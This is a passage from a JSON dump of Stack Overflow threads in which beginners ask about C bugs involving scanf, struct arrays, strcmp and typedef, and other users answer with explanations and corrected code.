41370673, "comment_id": 69943518, "body": "Using <code>scanf(&quot;%s&quot;, &amp;a);</code> with <code>char a;</code> is a recipe for disaster.  You&#39;re telling <code>scanf()</code> there&#39;s enough space for at least two characters (a letter and a null byte to terminate the string) in a single <code>char</code> \u2014 and there isn&#39;t.  You should probably be using <code>scanf(&quot; %c&quot;, &amp;a);</code> where the space before the <code>%</code> is crucial \u2014 it skips stray newlines and other white space."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1482966259, "post_id": 41370673, "comment_id": 69943565, "body": "Your code isn&#39;t dreadfully happy when you select barcode 0."}], "answers": [{"comments": [{"owner": {"reputation": 1028, "user_id": 6367382, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/175db0b1397c4a1080a871263e735251?s=128&d=identicon&r=PG&f=1", "display_name": "paweldac", "link": "https://stackoverflow.com/users/6367382/paweldac"}, "reply_to_user": {"reputation": 11, "user_id": 5746244, "user_type": "registered", "accept_rate": 40, "profile_image": "https://graph.facebook.com/1530790816934605/picture?type=large", "display_name": "daniel", "link": "https://stackoverflow.com/users/5746244/daniel"}, "edited": false, "score": 0, "creation_date": 1482965509, "post_id": 41370699, "comment_id": 69943362, "body": "@AddzifiMochGumelar it was general comment about your code. BTW we are not &#39;bro&#39;."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1482965813, "post_id": 41370699, "comment_id": 69943444, "body": "He&#39;s not using the input as the array index, he&#39;s comparing it to <code>detail[i].barcode</code>."}, {"owner": {"reputation": 11, "user_id": 5746244, "user_type": "registered", "accept_rate": 40, "profile_image": "https://graph.facebook.com/1530790816934605/picture?type=large", "display_name": "daniel", "link": "https://stackoverflow.com/users/5746244/daniel"}, "reply_to_user": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1482966292, "post_id": 41370699, "comment_id": 69943573, "body": "@barmar  so how to make input as the array?"}], "tags": [], "owner": {"reputation": 1028, "user_id": 6367382, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/175db0b1397c4a1080a871263e735251?s=128&d=identicon&r=PG&f=1", "display_name": "paweldac", "link": "https://stackoverflow.com/users/6367382/paweldac"}, "is_accepted": false, "score": 0, "last_activity_date": 1482964584, "creation_date": 1482964584, "answer_id": 41370699, "question_id": 41370673, "link": "https://stackoverflow.com/questions/41370673/why-is-it-not-displaying-output-according-record/41370699#41370699", "title": "Why is it not displaying output according record?", "body": "<p>In C/C++ indexing starts from 0 not 1.</p>\n\n<p>ibarcode[10] means that there are indexes from 0 to 9.</p>\n"}, {"tags": [], "owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "is_accepted": false, "score": 1, "last_activity_date": 1482966905, "creation_date": 1482966905, "answer_id": 41371024, "question_id": 41370673, "link": "https://stackoverflow.com/questions/41370673/why-is-it-not-displaying-output-according-record/41371024#41371024", "title": "Why is it not displaying output according record?", "body": "<p>The problem is that you're not using the correct index into <code>detail</code> when you print the receipt. You're printing the fields from <code>detail[k]</code>, but <code>k</code> isn't the index of the item that the customer purchased, it's just the current iteration of the <code>for()</code> loop.</p>\n\n<p>You need to save the index <code>i</code> that you found when searching <code>detail</code> in the first loop to get the price.</p>\n\n<p>Instead of lots of separate arrays, it would be better to have another struct that contains the purchase details. It can use a pointer to refer to the item in the <code>details</code> array.</p>\n\n<pre><code>struct purchase {\n    struct item *item;\n    int qty;\n    int tot;\n} items[10];\n</code></pre>\n\n<p>Then your first loop would look like:</p>\n\n<pre><code>for (j = 0; j &lt; 10; j++) {\n    int barcode;\n    scanf(\"%d\", &amp;barcode);\n    int item_found = 0;\n    for (i = 0; i &lt; 10; i++)\n    {\n        if (barcode == detail[i].barcode)\n        {\n            int qty;\n            printf(\"item : %s\\n\", detail[i].name);\n            printf(\"price : %d\\n\", detail[i].price);\n            printf(\"enter quantity : \");\n            scanf(\"%d\", qty);\n            items[j].qty = qty;\n            items[j].tot = qty * deatail[i].price;\n            items[j].item = &amp;detail[i];\n            item_found = 1;\n            break;\n        }\n    }\n    if (!item_found) {\n    {\n        printf(\"Barcode isn't valid'\\n\");\n        j--;\n        break;\n    } \n}\n</code></pre>\n\n<p>Then you can access the detail info when printing the receipt:</p>\n\n<pre><code>for (k = 0; k &lt;= j; k++)\n{\n    grand += tot[k];\n    printf(\"|    %d \\t  | %s\\t                | %d\\t\\t       | %d\\t\\t\\t| %d |\\n\", item[k].item-&gt;barcode, item[k].item-&gt;name, item[k].item-&gt;price, item[k].qty, item[k].tot);\n}\n</code></pre>\n"}], "owner": {"reputation": 11, "user_id": 5746244, "user_type": "registered", "accept_rate": 40, "profile_image": "https://graph.facebook.com/1530790816934605/picture?type=large", "display_name": "daniel", "link": "https://stackoverflow.com/users/5746244/daniel"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 35, "favorite_count": 1, "answer_count": 2, "score": -1, "last_activity_date": 1482966905, "creation_date": 1482964421, "last_edit_date": 1482965482, "question_id": 41370673, "link": "https://stackoverflow.com/questions/41370673/why-is-it-not-displaying-output-according-record", "title": "Why is it not displaying output according record?", "body": "<p>I want to make cashier program using C language. I use a structure for the record, but when I enter 1 for bar code input, it is not displaying item 1; instead it displays item 2. Here is my code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nstruct item\n{\n    char name[10];\n    int price;\n    int barcode;\n};\nstruct item detail[10] = {\n        \"item1\", 10, 1,\n        \"item2\", 20, 2,\n        \"item3\", 30, 3,\n        \"item4\", 40, 4,\n        \"item1\", 50, 5,\n        \"item2\", 60, 6,\n        \"item3\", 70, 7,\n        \"item4\", 80, 8,\n        \"item3\", 90, 9,\n        \"item4\", 100, 10\n};\nint main()\n{\n    int ibarcode[10];\n    int qty[10];\n    int tot[10];\n    int j, i, k, grand;\n    char a;\n    printf(\"Program Kasir\\n\");\n    for (j = 0; j &lt; 10; j++)\n    {\n        printf(\"ebter barcode : \");\n        scanf(\"%d\", &amp;ibarcode[j]);\n        for (i = 0; i &lt; 10; i++)\n        {\n            if (ibarcode[j] == detail[i].barcode)\n            {\n                printf(\"item : %s\\n\", detail[i].name);\n                printf(\"price : %d\\n\", detail[i].price);\n                printf(\"enter quantity : \");\n                scanf(\"%d\", &amp;qty[j]);\n                tot[j] = detail[j].price * qty[j];\n            }\n            if (ibarcode[j] &gt; 10)\n            {\n                printf(\"Barcode isn't valid'\\n\");\n                j--;\n                break;\n            }\n        }\n        printf(\"\\nbuy again? [Y/N] = \");\n        scanf(\"%s\", &amp;a);\n        if (a == 'Y' || a == 'y')\n        {\n            continue;\n        } else\n        {\n            break;\n        }\n    }\n    grand = 0;\n    system(\"cls\");\n    printf(\"\\n name Kasir = Addzifi Moch G\\n\");\n    printf(\" Tanggal    = 03 januari 2017\\n\");\n    printf(\" Jam        = 14:05 WIB\\n\\n\");\n    printf(\"+-------------------------------------------------------------------------------------------------+\\n\");\n    printf(\"| Barcode | item    \\t\\t\\t| price     \\t\\t| quantity  \\t| Total   |\\n\");\n    printf(\"+-------------------------------------------------------------------------------------------------+\\n\");\n    for (k = 0; k &lt;= j; k++)\n    {\n        grand += tot[k];\n        printf(\"|    %d \\t  | %s\\t                | %d\\t\\t       | %d\\t\\t\\t| %d |\\n\", ibarcode[k], detail[k].name, detail[k].price, qty[k], tot[k]);\n    }\n    printf(\"+-------------------------------------------------------------------------------------------------+\\n\");\n    printf(\"|\\t\\t\\t\\t\\t\\t\\t  Total Yang Harus Dibayarkan  =  %d |\\n\", grand);\n    printf(\"+-------------------------------------------------------------------------------------------------+\\n\");\n}\n</code></pre>\n"}, {"tags": ["c", "struct", "scanf"], "comments": [{"owner": {"reputation": 35578, "user_id": 3000206, "user_type": "registered", "accept_rate": 98, "profile_image": "https://i.stack.imgur.com/BK1fo.jpg?s=128&g=1", "display_name": "Carcigenicate", "link": "https://stackoverflow.com/users/3000206/carcigenicate"}, "edited": false, "score": 0, "creation_date": 1482964418, "post_id": 41370669, "comment_id": 69942977, "body": "What&#39;s the error?"}, {"owner": {"reputation": 1, "user_id": 7351756, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8b780bf414b1e89d77430e4ff9a75f3c?s=128&d=identicon&r=PG&f=1", "display_name": "Beer640", "link": "https://stackoverflow.com/users/7351756/beer640"}, "reply_to_user": {"reputation": 35578, "user_id": 3000206, "user_type": "registered", "accept_rate": 98, "profile_image": "https://i.stack.imgur.com/BK1fo.jpg?s=128&g=1", "display_name": "Carcigenicate", "link": "https://stackoverflow.com/users/3000206/carcigenicate"}, "edited": false, "score": 0, "creation_date": 1482964482, "post_id": 41370669, "comment_id": 69943004, "body": "Windows has stopped working and it&#39;s checking for a solution for that error with that loading bar...bad memory allocation?"}, {"owner": {"reputation": 2137, "user_id": 1212725, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/152c2f757fe98760a1cca54a21f63a31?s=128&d=identicon&r=PG", "display_name": "bruceg", "link": "https://stackoverflow.com/users/1212725/bruceg"}, "edited": false, "score": 2, "creation_date": 1482964929, "post_id": 41370669, "comment_id": 69943163, "body": "looks like you should call malloc outside the for loop in function()"}], "owner": {"reputation": 1, "user_id": 7351756, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8b780bf414b1e89d77430e4ff9a75f3c?s=128&d=identicon&r=PG&f=1", "display_name": "Beer640", "link": "https://stackoverflow.com/users/7351756/beer640"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 26, "favorite_count": 0, "closed_date": 1482965412, "answer_count": 0, "score": 0, "last_activity_date": 1482965526, "creation_date": 1482964403, "last_edit_date": 1482965526, "question_id": 41370669, "link": "https://stackoverflow.com/questions/41370669/about-structs-c", "closed_reason": "Duplicate", "title": "About structs - c", "body": "<p>So I am trying to write this piece of code and test a few things out with structs.. It compiles but when I reach the \"scanf(\"%d\",sp[i].cylinder);\" exe crashes when I give scanf an int input..Am I missing something obvious here?</p>\n\n<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n\nstruct car {\n    char name[20];      \n    char company[20]; \n    int  cylinder;  \n    int  year;\n    int  plates;        \n};\n\nstruct car *sp;   \n\nvoid function();\n\nint main() {\n    int maxcars=3;\n    printf(\"Give number of cars \\n\");\n    //scanf(\"%d\", &amp;maxcars);\n\n    function(maxcars);\n\n    printf(\"There are %d cars\\n\", maxcars);\n\n    int i;\n    for(i = 0; i &lt; maxcars; i++){\n        printf(\"%s\\n\", i, sp[i].name);\n        printf(\"%s\\n\", i, sp[i].company);\n        printf(\"%d\\n\", i, sp[i].cylinder);\n        printf(\"%d\\n\", i, sp[i].year);\n        printf(\"%d\\n\", i, sp[i].plates);\n    }\n\n    if (sp) {\n        free(sp);\n    }\n    getchar();\n    return 0;\n}\n\nvoid function(int maxcars) {\n    // \n\n\n    int i;\n    for (i = 1; i &lt; maxcars; i++) {\n        sp = malloc(maxcars * sizeof(struct car));\n        printf(\"Struct for car no%d is beeing created\\n\", i);\n        printf(\"Give Name: \\n\");\n        scanf(\"%s\",sp[i].name);\n        printf(\"Give Manufactorer Company: \\n\");\n        scanf(\"%s\",sp[i].company);\n        printf(\"Give Cylinder Capacity: \\n\");\n        scanf(\"%d\",sp[i].cylinder);\n        printf(\"Give Year of Production: \\n\");\n        scanf(\"%d\",sp[i].year);\n        printf(\"Give Plate Number: \\n\");\n        scanf(\"%d\",sp[i].plates);\n\n        printf(\"%s\\n\",sp[i].name);\n        printf(\"%s\\n\",sp[i].company);\n        printf(\"%d\\n\",sp[i].cylinder);\n        printf(\"%d\\n\",sp[i].year);\n        printf(\"%d\\n\",sp[i].plates);\n    }\n}\n</code></pre>\n\n<p>//edit : fixed some later for after the function where i had a couple typos but wouldn't affect my main issue..crashing still happening</p>\n\n<p>//edit 2- solution: It was eventually the &amp; missing in scanf..thanks for pointing it out dave!i had a feeling it was something obvious..</p>\n"}, {"tags": ["c", "scanf"], "answers": [{"comments": [{"owner": {"reputation": 13, "user_id": 6388863, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/59fc34b7dd669ac33ce3508328fdd2fe?s=128&d=identicon&r=PG&f=1", "display_name": "g4rrucho", "link": "https://stackoverflow.com/users/6388863/g4rrucho"}, "edited": false, "score": 0, "creation_date": 1482967227, "post_id": 41370667, "comment_id": 69943847, "body": "In start comparison you&#39;re right. But the exit one is correct"}, {"owner": {"reputation": 13, "user_id": 6388863, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/59fc34b7dd669ac33ce3508328fdd2fe?s=128&d=identicon&r=PG&f=1", "display_name": "g4rrucho", "link": "https://stackoverflow.com/users/6388863/g4rrucho"}, "edited": false, "score": 0, "creation_date": 1482967239, "post_id": 41370667, "comment_id": 69943855, "body": "Thanks for the tip :)"}], "tags": [], "owner": {"reputation": 2704, "user_id": 6794772, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/2d8db2b0d48b6e1b25657fda9ec4ae02?s=128&d=identicon&r=PG&f=1", "display_name": "Dellowar", "link": "https://stackoverflow.com/users/6794772/dellowar"}, "is_accepted": false, "score": 1, "last_activity_date": 1482985111, "last_edit_date": 1482985111, "creation_date": 1482964400, "answer_id": 41370667, "question_id": 41370618, "link": "https://stackoverflow.com/questions/41370618/how-to-create-a-command-line-in-c/41370667#41370667", "title": "How to create a command line in C?", "body": "<p><code>strcmp(cmd, \"start\")</code> means \"when cmd does not equal start\". You need <code>!strcmp(cmd, \"start\")</code>.</p>\n"}, {"comments": [{"owner": {"reputation": 13, "user_id": 6388863, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/59fc34b7dd669ac33ce3508328fdd2fe?s=128&d=identicon&r=PG&f=1", "display_name": "g4rrucho", "link": "https://stackoverflow.com/users/6388863/g4rrucho"}, "edited": false, "score": 0, "creation_date": 1482967064, "post_id": 41370772, "comment_id": 69943795, "body": "The condition in while is correct. See if I enter &quot;exit&quot;, strcmp(cmd, &quot;exit) is equal to 0, then the program will exit the loop. That&#39;s what I want."}, {"owner": {"reputation": 13, "user_id": 6388863, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/59fc34b7dd669ac33ce3508328fdd2fe?s=128&d=identicon&r=PG&f=1", "display_name": "g4rrucho", "link": "https://stackoverflow.com/users/6388863/g4rrucho"}, "edited": false, "score": 0, "creation_date": 1482967107, "post_id": 41370772, "comment_id": 69943808, "body": "Thanks for the fgets suggestion. Works like a charm :)"}], "tags": [], "owner": {"reputation": 2568, "user_id": 2660282, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/6c66cd2b6bda52c5ff72783ef727d907?s=128&d=identicon&r=PG", "display_name": "Quest", "link": "https://stackoverflow.com/users/2660282/quest"}, "is_accepted": true, "score": 5, "last_activity_date": 1482967270, "last_edit_date": 1482967270, "creation_date": 1482965033, "answer_id": 41370772, "question_id": 41370618, "link": "https://stackoverflow.com/questions/41370618/how-to-create-a-command-line-in-c/41370772#41370772", "title": "How to create a command line in C?", "body": "<p>Use <a href=\"http://www.cplusplus.com/reference/cstdio/fgets/\" rel=\"nofollow noreferrer\"><code>fgets</code></a> instead to read the whole input as shown below: </p>\n\n<pre><code>char cmd[255];\nfgets(cmd, 255, stdin);\n</code></pre>\n\n<p>The sample can be found <a href=\"http://ideone.com/lyocxE\" rel=\"nofollow noreferrer\">here</a>.</p>\n\n<hr>\n\n<p>Also, the <a href=\"http://www.cplusplus.com/reference/cstring/strcmp/\" rel=\"nofollow noreferrer\"><code>strcmp</code></a> function is not used correctly in your example.<a href=\"http://www.cplusplus.com/reference/cstring/strcmp/\" rel=\"nofollow noreferrer\"><code>Strcmp</code></a> returns:</p>\n\n<ul>\n<li>&lt;0 when the first character that does not match has a lower value in ptr1 than in ptr2,</li>\n<li>0 when they are equal</li>\n<li>'>0 when the first character that does not match has a greater value in ptr1 than in ptr2</li>\n</ul>\n\n<p>So in your example, you should use <code>strcmp(str1, str2) == 0</code> or <code>!strcmp(str1, str2)</code> for short.</p>\n\n<hr>\n\n<p><strong><em>Note:</em></strong> <em>Care should be taken when using <code>fgets</code>. A newline character is considered valid by <code>fgets</code> and it is <strong>included</strong> in the string. On the other side with <code>scanf(\" %s\")</code> a newline is <strong>not included</strong> in the resulting string.</em></p>\n"}, {"tags": [], "owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "is_accepted": false, "score": 1, "last_activity_date": 1482966484, "creation_date": 1482966484, "answer_id": 41370970, "question_id": 41370618, "link": "https://stackoverflow.com/questions/41370618/how-to-create-a-command-line-in-c/41370970#41370970", "title": "How to create a command line in C?", "body": "<p>The program jams because you read everything up to the first newline, but then you go back again and the <code>scanf()</code> finds a newline, which isn't allowed by the scan set, so it reads no characters and leaves the newline in place for the next time round the loop.</p>\n\n<p>You should be checking the return value from <code>scanf()</code>; if it is zero, then the next character isn't valid for the format string.</p>\n\n<p>You have to read the newline.</p>\n\n<p>One simple way is to include a space before the <code>%[\u2026]</code> scan set in the format string.  That skips leading white space, including newlines, before reading the rest of a line of information (and the <code>39</code> prevents buffer overflows):</p>\n\n<pre><code>if (scanf(\" %39[^\\n]\", cmd) == 1)\n    \u2026process the string in cmd\u2026\nelse\n    \u2026report error\u2026\n</code></pre>\n\n<p>Another simple way is to use a loop after the <code>scanf()</code>:</p>\n\n<pre><code>int c;\nwhile ((c = getchar()) != EOF &amp;&amp; c != '\\n')\n    ;\n</code></pre>\n\n<p>Alternatively, as others have suggested, read a line of input and then process that, perhaps with <code>sscanf()</code> to read the information into your command name variable.</p>\n"}], "owner": {"reputation": 13, "user_id": 6388863, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/59fc34b7dd669ac33ce3508328fdd2fe?s=128&d=identicon&r=PG&f=1", "display_name": "g4rrucho", "link": "https://stackoverflow.com/users/6388863/g4rrucho"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2178, "favorite_count": 1, "accepted_answer_id": 41370772, "answer_count": 3, "score": 1, "last_activity_date": 1482985111, "creation_date": 1482964119, "question_id": 41370618, "link": "https://stackoverflow.com/questions/41370618/how-to-create-a-command-line-in-c", "title": "How to create a command line in C?", "body": "<p>I'm trying to create a command line for an app in C.  </p>\n\n<pre><code>int main(int argc, char const *argv[])\n{\n  char cmd[40];\n\n  do {\n    scanf(\"%[^\\n]\", cmd);\n\n    if(strcmp(cmd, \"start\"))\n      new_game();\n  } while(strcmp(cmd, \"exit\"));\n  return 0;\n}\n</code></pre>\n\n<p>I can't use the \"%s\" because the command might have more than one argument so I need to use the exception and ignore the new line char. The problem is that the program won't call the scanf anymore after one insertion. Why is this happening?</p>\n\n<p>Thank You</p>\n"}, {"tags": ["c", "struct", "typedef", "difference"], "comments": [{"owner": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "edited": false, "score": 1, "creation_date": 1482961811, "post_id": 41370135, "comment_id": 69942088, "body": "You could probably use any of them as long as you are aware that the order of the members is different."}, {"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 2, "creation_date": 1482962060, "post_id": 41370135, "comment_id": 69942178, "body": "&quot;when I look at a function in the same program&quot;. What do you mean by that? I&#39;m guessing that the <code>struct</code> is not defined inside a function (it could be but I&#39;m guessing that&#39;s not what you mean). You probably mean in the same file as a function that uses it. If that is the case then the answer is &quot;it depends&quot;. It depends where the <code>typedef</code> is defined and whether the function can see it. We don&#39;t have your full code context and can&#39;t tell whether that is the case or not."}], "answers": [{"comments": [{"owner": {"reputation": 11, "user_id": 7296937, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b99ed7ed7598360e04f498855841dba1?s=128&d=identicon&r=PG&f=1", "display_name": "HaniMasta", "link": "https://stackoverflow.com/users/7296937/hanimasta"}, "edited": false, "score": 0, "creation_date": 1482962803, "post_id": 41370255, "comment_id": 69942432, "body": "Thanks! I will make sure I fully understand the differences!"}, {"owner": {"reputation": 50953, "user_id": 1983495, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/aMDiK.jpg?s=128&g=1", "display_name": "Iharob Al Asimi", "link": "https://stackoverflow.com/users/1983495/iharob-al-asimi"}, "reply_to_user": {"reputation": 11, "user_id": 7296937, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b99ed7ed7598360e04f498855841dba1?s=128&d=identicon&r=PG&f=1", "display_name": "HaniMasta", "link": "https://stackoverflow.com/users/7296937/hanimasta"}, "edited": false, "score": 1, "creation_date": 1482963686, "post_id": 41370255, "comment_id": 69942727, "body": "@HaniMasta The order of the members is very important."}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1482964803, "post_id": 41370255, "comment_id": 69943120, "body": "The presence or absence of a structure tag is also very significant."}], "tags": [], "owner": {"reputation": 48, "user_id": 7343490, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yuE7o.jpg?s=128&g=1", "display_name": "jonahisadev", "link": "https://stackoverflow.com/users/7343490/jonahisadev"}, "is_accepted": false, "score": 3, "last_activity_date": 1482964690, "last_edit_date": 1495535431, "creation_date": 1482962120, "answer_id": 41370255, "question_id": 41370135, "link": "https://stackoverflow.com/questions/41370135/difference-between-typedef-struct-and-struct-in-a-function-in-c/41370255#41370255", "title": "Difference between typedef struct and struct in a function in C", "body": "<p>Not necessarily. Since the struct is declared in global scope, you can still use it. Just keep in mind the differences between <code>typedef struct</code> and <code>struct</code> which you can read up on <a href=\"https://stackoverflow.com/questions/1675351/typedef-struct-vs-struct-definitions\">here</a> and know that the order of the members in the global struct is different than the order of the members in the function struct, which is also quite important.</p>\n"}, {"comments": [{"owner": {"reputation": 11, "user_id": 7296937, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b99ed7ed7598360e04f498855841dba1?s=128&d=identicon&r=PG&f=1", "display_name": "HaniMasta", "link": "https://stackoverflow.com/users/7296937/hanimasta"}, "edited": false, "score": 0, "creation_date": 1483027416, "post_id": 41370701, "comment_id": 69968320, "body": "It is much clearer now what to use and not and why. I thank you for your time Mr!"}], "tags": [], "owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "is_accepted": false, "score": 1, "last_activity_date": 1482964597, "creation_date": 1482964597, "answer_id": 41370701, "question_id": 41370135, "link": "https://stackoverflow.com/questions/41370135/difference-between-typedef-struct-and-struct-in-a-function-in-c/41370701#41370701", "title": "Difference between typedef struct and struct in a function in C", "body": "<p>The data types whose declarations you present are not \"compatible types\" as the standard defines the term, and therefore they cannot be used interchangeably.  For structure types to be compatible, they must have not only the same member names and types in the same order, but also the same <em>tag</em>.  It is on the last point that the two differ.</p>\n\n<p>In particular, your <code>typedef</code> defines the identifier <code>arguments</code> as an alias for a <em>tagless</em> structure type with the specified members.  Where that identifier is in scope, you can use it as a type name.  Indeed, because the structure type to which it refers has no tag, there is no other way to refer to that type.</p>\n\n<p>The other declaration declares a structure type with <em>tag</em> <code>arguments</code>.  Where that declaration is in scope, you can refer to that type as <code>struct arguments</code>, but not as just <code>arguments</code> (C++ differs on this point):</p>\n\n<pre><code>struct arguments my_arguments;\n\nmy_arguments.width = 5;\n// ...\n</code></pre>\n\n<blockquote>\n  <p>My question is, is it necassary to add this struct arguments in the function since i already declared it in global?</p>\n</blockquote>\n\n<p>C has no global declarations.  It has file-scope declarations, and by default these declare functions and objects with external linkage, which means they can be accessed from anywhere in the program. That's not quite the same thing.  Wherever you use either of those types, therefore, a declaration for it must be in scope.  One ordinarily puts shared declarations in a header file to make it easy to fulfill such requirements.  In any case, a declaration of one of those types does not serve as a declaration of the other.</p>\n\n<p>You could, however, consider making them compatible by tagging the typedefed structure, either in one declaration ...</p>\n\n<pre><code>typedef struct arguments  // &lt;--- note the tag here\n{\n    float width, height, start;\n    unsigned int *pixmap;\n} arguments;\n</code></pre>\n\n<p>... or in two ...</p>\n\n<pre><code>struct arguments\n{\n    float width, height, start;\n    unsigned int *pixmap;\n};\n\ntypedef struct arguments arguments;\n</code></pre>\n\n<p>Either alternative makes <code>arguments</code> an alias for type <code>struct arguments</code>.</p>\n"}], "owner": {"reputation": 11, "user_id": 7296937, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b99ed7ed7598360e04f498855841dba1?s=128&d=identicon&r=PG&f=1", "display_name": "HaniMasta", "link": "https://stackoverflow.com/users/7296937/hanimasta"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1571, "favorite_count": 0, "closed_date": 1482966770, "answer_count": 2, "score": 1, "last_activity_date": 1482964690, "creation_date": 1482961404, "question_id": 41370135, "link": "https://stackoverflow.com/questions/41370135/difference-between-typedef-struct-and-struct-in-a-function-in-c", "closed_reason": "Duplicate", "title": "Difference between typedef struct and struct in a function in C", "body": "<p>I got the following code I am analyzing, and I am not really sure about the typedef struct and struct in functions. \nIn global the following code is: </p>\n\n<pre><code>typedef struct\n{\n    float width, height, start;\n    unsigned int *pixmap;\n}arguments;\n</code></pre>\n\n<p>But when I look at a function in the same program below I can find this:</p>\n\n<pre><code>  struct arguments{\n    float start;\n    float width;\n    float height;\n    unsigned int *pixmap;\n  };\n</code></pre>\n\n<p>My question is, is it necassary to add this <code>struct arguments</code> in the function since i already declared it in global?</p>\n"}, {"tags": ["c", "arrays", "naming"], "comments": [{"owner": {"reputation": 28373, "user_id": 4926357, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d3f559694d3ca65b39220166b865276d?s=128&d=identicon&r=PG&f=1", "display_name": "A.S.H", "link": "https://stackoverflow.com/users/4926357/a-s-h"}, "edited": false, "score": 21, "creation_date": 1482961370, "post_id": 41370087, "comment_id": 69941874, "body": "Multidimensional arrays just do that."}, {"owner": {"reputation": 10579, "user_id": 1046007, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c1c27f58af84eeaad72231f198e7c369?s=128&d=identicon&r=PG", "display_name": "Walter Tross", "link": "https://stackoverflow.com/users/1046007/walter-tross"}, "edited": false, "score": 4, "creation_date": 1482961412, "post_id": 41370087, "comment_id": 69941900, "body": "what is the reason for not using an array of structures/arrays?"}, {"owner": {"user_type": "does_not_exist", "display_name": "user3458"}, "edited": false, "score": 3, "creation_date": 1482961434, "post_id": 41370087, "comment_id": 69941909, "body": "First, please consult the language&#39;s syntax. Second - what are you trying to accomplish? Why numbers for names?"}, {"owner": {"reputation": 359, "user_id": 5909831, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DmP33.png?s=128&g=1", "display_name": "Mr. Poe", "link": "https://stackoverflow.com/users/5909831/mr-poe"}, "reply_to_user": {"reputation": 10579, "user_id": 1046007, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c1c27f58af84eeaad72231f198e7c369?s=128&d=identicon&r=PG", "display_name": "Walter Tross", "link": "https://stackoverflow.com/users/1046007/walter-tross"}, "edited": false, "score": 2, "creation_date": 1482962214, "post_id": 41370087, "comment_id": 69942234, "body": "@Walter Tross It&#39;s because I&#39;m developing for the Sega Saturn. I&#39;m porting a game from the Sega Genesis to the Sega Saturn, and I&#39;m following how the game works in 68k asm down to the tee."}, {"owner": {"reputation": 34922, "user_id": 586873, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/11ba1f932f0af556969448ffba230d9a?s=128&d=identicon&r=PG", "display_name": "Grzegorz Szpetkowski", "link": "https://stackoverflow.com/users/586873/grzegorz-szpetkowski"}, "edited": false, "score": 0, "creation_date": 1482962237, "post_id": 41370087, "comment_id": 69942238, "body": "Even if it would be possible, it is important to consider that such code essentially violates <i>DRY</i> principle."}, {"owner": {"reputation": 359, "user_id": 5909831, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DmP33.png?s=128&g=1", "display_name": "Mr. Poe", 